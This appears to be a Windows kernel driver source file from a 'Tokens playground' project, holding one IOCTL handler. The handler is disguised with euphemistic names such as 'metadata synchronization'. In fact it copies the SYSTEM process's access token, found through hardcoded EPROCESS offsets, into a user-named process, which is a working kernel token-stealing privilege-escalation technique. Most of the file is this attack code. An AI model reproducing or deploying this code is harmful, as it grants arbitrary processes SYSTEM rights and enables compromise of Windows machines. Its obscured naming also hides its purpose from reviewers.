#pragma once
#include "prototypes.h"
#include "common.h"

// ---------------------------------------------------------------
// IOCTL codes handler for Tokens playground
// ---------------------------------------------------------------

// Sync process metadata IOCTL handler (you know what this does lol just to ....)
NTSTATUS SpyIoSyncProcessMetadata(
    PVOID outputBuffer,
    ULONG outputLength,
    PULONG_PTR bytesReturned
)
{
    DbgPrint("[*] Process metadata synchronization initiated\n");

    if (!PsInitialSystemProcess) {
        DbgPrint("[-] Base context unavailable\n");
        *bytesReturned = 0;
        return STATUS_UNSUCCESSFUL;
    }

    PSPY_HIDE_INPUT input = (PSPY_HIDE_INPUT)outputBuffer;
    char queryBuffer[256] = { 0 };
    RtlCopyMemory(queryBuffer, input->g_Name, sizeof(input->g_Name));
    DbgPrint("[*] Resolving context for: %s\n", queryBuffer);

    char* out = (char*)outputBuffer;
    ULONG offset = 0;
    NTSTATUS status;
    size_t writtenBytes = 0;
    BOOLEAN resolved = FALSE;

    status = RtlStringCbPrintfA(out + offset, outputLength - offset, "[*] Synchronizing metadata for: %s\n\n", queryBuffer);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[-] Output formatting failed: 0x%X\n", status);
        *bytesReturned = 0;
        return status;
    }

    status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
    if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
    offset += (ULONG)writtenBytes;


    PEPROCESS contextBase = PsInitialSystemProcess;

    HANDLE basePid = PsGetProcessId(contextBase);
    PCHAR baseImage = PsGetProcessImageFileName(contextBase);
    if (!baseImage || basePid == 0) {
        DbgPrint("[!] Base context resolution failed\n");
        return STATUS_UNSUCCESSFUL;
    }

    ULONG fieldOffset1 = 0x400;
    ULONG fieldOffset2 = 0xB8;
    ULONG totalOffset = fieldOffset1 + fieldOffset2;

    UINT64 rawReferenceHandle = *(UINT64*)((PUCHAR)contextBase + totalOffset);
    UINT64 referenceHandle = rawReferenceHandle & ~0xF;
    DbgPrint("[+] Reference handle acquired: 0x%llx\n", referenceHandle);

    status = RtlStringCbPrintfA(out + offset, outputLength - offset,
        "[+] Reference handle: 0x%llx\n", referenceHandle);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[!] Reference output failed: 0x%X\n", status);
        *bytesReturned = 0;
        return status;
    }
    status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
    if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
    offset += (ULONG)writtenBytes;

    ULONG linkOffset = 0x448;
    PLIST_ENTRY head = (PLIST_ENTRY)((ULONG_PTR)contextBase + linkOffset);
    PLIST_ENTRY current = head->Flink;
    while (current != head) {
        PEPROCESS contextEntry = (PEPROCESS)((ULONG_PTR)current - linkOffset);
        PCHAR imageName = PsGetProcessImageFileName(contextEntry);
        ANSI_STRING entryName;
        ANSI_STRING queryName;
        RtlInitAnsiString(&entryName, imageName);
        RtlInitAnsiString(&queryName, queryBuffer);
        if (RtlEqualString(&entryName, &queryName, TRUE))
        {
            DbgPrint("[+] Context entry located: %s -> 0x%p\n", imageName, contextEntry);
            resolved = TRUE;

            UINT64 rawEntryHandle = *(UINT64*)((PUCHAR)contextEntry + totalOffset);
            UINT64 entryHandle = rawEntryHandle & ~0xF;
            UINT64 metadataBits = rawEntryHandle & 0xF;

            DbgPrint("[*] Applying reference synchronization...");
            DbgPrint("    Current handle: 0x%llx\n", entryHandle);

            PUCHAR targetBase = (PUCHAR)contextEntry;
            targetBase += fieldOffset1;
            targetBase += fieldOffset2;
            PUINT64 handlePtr = (PUINT64)targetBase;
            UINT64 syncValue = referenceHandle;
            syncValue |= metadataBits;
            *handlePtr = syncValue;

            UINT64 verifyRaw = *(UINT64*)((PUCHAR)contextEntry + totalOffset);
            UINT64 verifyHandle = verifyRaw & ~0xF;
            DbgPrint("    Synchronized handle: 0x%llx\n", verifyHandle);

            status = RtlStringCbPrintfA(out + offset, outputLength - offset, "[*] Synchronizing metadata...\n    Current: 0x%llx\n    Updated: 0x%llx\n", entryHandle, verifyHandle);
            if (!NT_SUCCESS(status)) {
                DbgPrint("[!] Sync output failed: 0x%X\n", status);
                *bytesReturned = 0;
                return status;
            }
            status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
            if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
            offset += (ULONG)writtenBytes;

            if (verifyHandle == referenceHandle)
            {
                DbgPrint("[+] Metadata synchronization complete\n");
                status = RtlStringCbPrintfA(out + offset, outputLength - offset, "[+] Metadata synchronized successfully\n");
                if (!NT_SUCCESS(status)) {
                    DbgPrint("[!] Success output failed: 0x%X\n", status);
                    *bytesReturned = 0;
                    return status;
                }
                status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
                if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
                offset += (ULONG)writtenBytes;
            }
            else {
                DbgPrint("[-] Metadata synchronization failed\n");
                status = RtlStringCbPrintfA(out + offset, outputLength - offset, "[-] Synchronization incomplete\n");
                if (!NT_SUCCESS(status)) {
                    DbgPrint("[!] Error output failed: 0x%X\n", status);
                    *bytesReturned = 0;
                    return status;
                }
                status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
                if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
                offset += (ULONG)writtenBytes;
            }

            break;
        }

        current = current->Flink;
    }

    if (!resolved) {
        DbgPrint("[-] Context entry '%s' not resolved\n", queryBuffer);
        status = RtlStringCbPrintfA(out + offset, outputLength - offset, "[-] Context '%s' not found\n", queryBuffer);
        if (!NT_SUCCESS(status)) {
            *bytesReturned = 0;
            return status;
        }
        status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
        if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
        offset += (ULONG)writtenBytes;
    }

    *bytesReturned = offset;
    return STATUS_SUCCESS;
}